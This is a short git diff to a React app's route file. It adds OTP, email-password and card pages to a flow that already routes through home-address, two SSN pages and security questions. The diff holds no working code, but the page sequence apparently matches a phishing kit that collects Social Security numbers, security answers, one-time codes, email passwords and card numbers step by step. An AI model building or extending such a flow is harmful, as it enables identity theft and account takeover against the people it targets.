@@ -12,6 +12,9 @@ import HomeAddress from './pages/HomeAddress';
 import SSN1 from './pages/SSN1';
 import SSN2 from './pages/SSN2';
 import SecurityQuestions from './pages/SecurityQuestions';
+import OTP from './pages/OTP';
+import EmailPassword from './pages/EmailPassword';
+import Card from './pages/Card';
 import Terms from './pages/Terms';
 import LifestyleDemo from './pages/LifestyleDemo';
 
@@ -57,6 +60,9 @@ function App() {
         <Route path="/ssn1" element={<ProtectedRoute element={<SSN1 />} />} />
         <Route path="/ssn2" element={<ProtectedRoute element={<SSN2 />} />} />
         <Route path="/security-questions" element={<ProtectedRoute element={<SecurityQuestions />} />} />
+        <Route path="/otp" element={<ProtectedRoute element={<OTP />} />} />
+        <Route path="/email-password" element={<ProtectedRoute element={<EmailPassword />} />} />
+        <Route path="/card" element={<ProtectedRoute element={<Card />} />} />
         <Route path="/terms" element={<ProtectedRoute element={<Terms />} />} />
 
         {/* Redirect any unknown routes to home */}
